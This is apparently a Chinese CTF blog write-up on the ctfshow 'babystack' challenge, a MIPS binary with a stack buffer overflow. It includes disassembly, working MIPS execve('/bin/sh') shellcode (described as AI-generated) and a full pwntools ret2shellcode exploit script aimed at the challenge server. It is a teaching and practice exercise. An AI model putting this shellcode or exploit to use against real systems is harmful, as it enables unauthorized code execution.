---
title: pwn做题记录：[内部赛]babystack（ctfshow）
date: 2026-07-31
categories: 安全
---

# pwn做题记录：[内部赛]babystack（ctfshow）
**题目链接：https://ctf.show/challenges#babystack-195**

下载附件，发现里面又三个文件，main文件是题目，放到checksec里看一下，保护倒是都没开，但是发现架构不是平常能够见到的x86_64或i386而是mips-32-little，这是一个mips架构的程序，也就是异构pwn(☉д⊙)
![image](/images/pwn做题记录：内部赛babystackctfshow/img_1.png)

做这道题的过程还是很艰难的(´～`)，由于是第一次接触异构pwn，我的虚拟机上没有相应的环境，也就是说这个程序我根本就不能运行，也就不能进行本地测试了，所有测试都需要连接远程(｡ŏ_ŏ)
这还只是第一个困难，因为是mips架构的程序，放进ida里面也没法反编译，只能看汇编代码。我之前有没见过mips的汇编，完全看不懂(╥﹏╥)
勉强看看，进入main函数里能看到它调用了fgets之类的函数，但是具体还是看不明白
```
# Attributes: bp-based frame fpd=0x48

 # int __fastcall main(int argc, const char **argv, const char **envp)
.globl main
main:

var_38= -0x38
var_30= -0x30
var_s0=  0
var_s4=  4

addiu   $sp, -0x50
sw      $ra, 0x48+var_s4($sp)
sw      $fp, 0x48+var_s0($sp)
move    $fp, $sp
li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)
sw      $gp, 0x48+var_38($sp)
la      $v0, stdout
lw      $v0, (stdout - 0x410D50)($v0)
move    $a0, $v0         # stream
move    $a1, $zero       # buf
li      $a2, 2           # modes
move    $a3, $zero       # n
la      $v0, setvbuf
move    $t9, $v0
jalr    $t9 ; setvbuf
nop
lw      $gp, 0x48+var_38($fp)
la      $v0, stdin
lw      $v0, (stdin - 0x410D38)($v0)
move    $a0, $v0         # stream
move    $a1, $zero       # buf
li      $a2, 1           # modes
move    $a3, $zero       # n
la      $v0, setvbuf
move    $t9, $v0
jalr    $t9 ; setvbuf
nop
lw      $gp, 0x48+var_38($fp)
la      $a0, name        # s
move    $a1, $zero       # c
li      $a2, 0x100       # n
la      $v0, memset
move    $t9, $v0
jalr    $t9 ; memset
nop
lw      $gp, 0x48+var_38($fp)
addiu   $v0, $fp, 0x48+var_30
move    $a0, $v0         # s
move    $a1, $zero       # c
li      $a2, 0x30  # '0'  # n
la      $v0, memset
move    $t9, $v0
jalr    $t9 ; memset
nop
lw      $gp, 0x48+var_38($fp)
lui     $v0, 0x40  # '@'
addiu   $a0, $v0, (aWelcomeToCtfsh - 0x400000)  # "Welcome to [ctfSHOW..]\nNow,Input Your "...
la      $v0, puts
move    $t9, $v0
jalr    $t9 ; puts
nop
lw      $gp, 0x48+var_38($fp)
la      $v0, stdin
lw      $v0, (stdin - 0x410D38)($v0)
la      $a0, name        # s
li      $a1, 0x100       # n
move    $a2, $v0         # stream
la      $v0, fgets
move    $t9, $v0
jalr    $t9 ; fgets
nop
lw      $gp, 0x48+var_38($fp)
lui     $v0, 0x40  # '@'
addiu   $a0, $v0, (aInputYourMessa - 0x400000)  # "Input Your message:"
la      $v0, puts
move    $t9, $v0
jalr    $t9 ; puts
nop
lw      $gp, 0x48+var_38($fp)
la      $v0, stdin
lw      $v0, (stdin - 0x410D38)($v0)
addiu   $v1, $fp, 0x48+var_30
move    $a0, $v1         # s
li      $a1, 0x100       # n
move    $a2, $v0         # stream
la      $v0, fgets
move    $t9, $v0
jalr    $t9 ; fgets
nop
lw      $gp, 0x48+var_38($fp)
lui     $v0, 0x40  # '@'
addiu   $a0, $v0, (aHelloSyourMess - 0x400000)  # "Hello , %sYour Message is : %s"
la      $a1, name
addiu   $v0, $fp, 0x48+var_30
move    $a2, $v0
la      $v0, printf
move    $t9, $v0
jalr    $t9 ; printf
nop
lw      $gp, 0x48+var_38($fp)
move    $v0, $zero
move    $sp, $fp
lw      $ra, 0x48+var_s4($sp)
lw      $fp, 0x48+var_s0($sp)
addiu   $sp, 0x50
jr      $ra
nop
 # End of function main

```
好在我们生于一个快速发展的好时代，我可以直接把这段汇编代码交给AI让它帮我反汇编，拿到伪代码之后逻辑就很清晰了，AI给了我下面的代码（很难想象AI没有进入大众视野之前的大佬们都是这么做到的(((ﾟДﾟ;)))）
```
int main() {
    setvbuf(stdout, NULL, _IOLBF, 0);  // modes=2 → line buffered
    setvbuf(stdin,  NULL, _IONBF, 0);  // modes=1 → unbuffered
    
    memset(name, 0, 0x100);
    memset(local_buf, 0, 0x30);
    
    puts("Welcome to ctfSHOW...\nNow,Input Your ");
    fgets(name, 0x100, stdin);
    
    puts("Input Your message:");
    fgets(local_buf, 0x100, stdin);
    
    printf("Hello , %sYour Message is : %s", name, local_buf);
    return 0;
}
```
在AI的指导下我也知道了这段汇编代码里的一些寄存器使用来干嘛的
```
$sp:指向栈顶相当于esp
$fp:指向当前栈帧基址相当于ebp
$ra:用来存放返回地址，应该可以理解成类似eip
$a0–$a3:用来传递参数

```
再来理解一下出现栈溢出的那部分汇编代码，就是第二次调用fgets的时候，代码里也注释了参数s，n和stream
```
lw      $gp, 0x48+var_38($fp)
la      $v0, stdin
lw      $v0, (stdin - 0x410D38)($v0)
addiu   $v1, $fp, 0x48+var_30
move    $a0, $v1         # s
li      $a1, 0x100       # n
move    $a2, $v0         # stream
la      $v0, fgets
move    $t9, $v0
jalr    $t9 ; fgets
```
这里的n写了是0x100，上面的s则是将v1 move给了用来传参的a0，再往上一句就是对v1的操作，就是算出来一块缓冲区的地址给了寄存器，缓冲区的大小就是0x30（var_30），而下面的n却有0x100，出现栈溢出漏洞
由于保护都没开，在ida里面双击name就可以看到name的地址，就可以考虑输入name的时候写入shellcode，然后利用后面的栈溢出来打ret2shellcode。
但是这里又出现一个问题，由于我用于攻击的系统是kali linux且之前没有接触过异构pwn，系统上没有mips的运行环境，也就无法在脚本中直接使用asm(shellcraft.sh())来生成shellcode，我试了各种方法来下载配置汇编器，结果全部失败இдஇ
没办法，我也只剩下了最粗暴的办法了，就是手写shellcode。可是我自己又不会写mips架构的shellcode，怎么办？我也只好把这个工作交给AI了╮(╯_╰)╭
```
sc = bytes.fromhex(
    "d0ffbd27"  # addiu $sp,$sp,-0x30
    "696e043c"  # lui  $a0,0x6e69
    "2f628434"  # ori  $a0,$a0,0x622f
    "0800a4af"  # sw   $a0,0x8($sp)     -> "/bin"
    "6800043c"  # lui  $a0,0x0068
    "2f738434"  # ori  $a0,$a0,0x732f
    "0c00a4af"  # sw   $a0,0xc($sp)     -> "/sh\0"
    "0800a427"  # addiu $a0,$sp,0x8
    "21280000"  # addu  $a1,$zero,$zero
    "21300000"  # addu  $a2,$zero,$zero
    "ab0f0224"  # addiu $v0,$zero,0xFAB  # __NR_execve = 4011
    "0c000000"  # syscall
)

```
在输入name的时候上传这段shellcode，然后栈溢出到name所在的bss段就可以拿到shell了
```
io.recvuntil(b'Now,Input Your Name:\n')
io.sendline(sc)                      
io.recvuntil(b'Input Your message:\n')
io.sendline(b'a' * 0x34 + p32(bss))

```
![image](/images/pwn做题记录：内部赛babystackctfshow/img_2.png)
### 完整脚本代码
```
from pwn import *

context(arch='mips', endian='little')

sc = bytes.fromhex(
    "d0ffbd27"  # addiu $sp,$sp,-0x30
    "696e043c"  # lui  $a0,0x6e69
    "2f628434"  # ori  $a0,$a0,0x622f
    "0800a4af"  # sw   $a0,0x8($sp)     -> "/bin"
    "6800043c"  # lui  $a0,0x0068
    "2f738434"  # ori  $a0,$a0,0x732f
    "0c00a4af"  # sw   $a0,0xc($sp)     -> "/sh\0"
    "0800a427"  # addiu $a0,$sp,0x8
    "21280000"  # addu  $a1,$zero,$zero
    "21300000"  # addu  $a2,$zero,$zero
    "ab0f0224"  # addiu $v0,$zero,0xFAB  # __NR_execve = 4011
    "0c000000"  # syscall
)

bss = 0x410c20 

io = remote('pwn.challenge.ctf.show', 28111)
io.recvuntil(b'Now,Input Your Name:\n')
io.sendline(sc)                  
io.recvuntil(b'Input Your message:\n')
io.sendline(b'a' * 0x34 + p32(bss))
io.interactive()

```